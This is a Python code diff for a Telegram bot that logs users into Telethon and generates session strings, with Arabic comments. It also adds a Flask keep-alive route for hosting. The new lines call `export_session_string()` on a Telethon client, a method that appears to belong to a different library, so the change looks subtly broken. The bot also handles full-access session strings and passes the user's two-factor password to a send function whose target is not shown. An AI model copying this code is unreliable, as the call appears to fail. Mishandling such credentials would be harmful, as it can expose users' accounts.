@@ -273,7 +273,7 @@ async def telethon_session_step(client, message):
         temp_client = user_data[user_id]["client"]
         try:
             await temp_client.sign_in(user_data[user_id]["phone"], phone_code)
-            session_string = await temp_client.session.save()
+            session_string = await temp_client.export_session_string()
             await send_telethon_session(user_id, session_string, message)
             await temp_client.disconnect()
             reset_user(user_id)
@@ -292,7 +292,7 @@ async def telethon_session_step(client, message):
         try:
             password = message.text
             await temp_client.sign_in(password=password)
-            session_string = await temp_client.session.save()
+            session_string = await temp_client.export_session_string()
             await send_telethon_session(user_id, session_string, message, password)
             await temp_client.disconnect()
             reset_user(user_id)
@@ -330,6 +330,23 @@ def reset_user(user_id):
     user_steps.pop(user_id, None)
     user_data.pop(user_id, None)
 
+# ====== إضافة مسار ويب لـ Render ======
+from flask import Flask, render_template_string
+import threading
+
+web_app = Flask(__name__)
+
+@web_app.route('/')
+def index():
+    return "✅ البوت شغال 24 ساعة!"
+
+def run_web():
+    web_app.run(host='0.0.0.0', port=8080)
+
+# تشغيل خادم الويب في خيط منفصل
+threading.Thread(target=run_web, daemon=True).start()
+
+# ====== تشغيل البوت ======
 if __name__ == "__main__":
     try:
         print("🚀 جاري تشغيل البوت...")
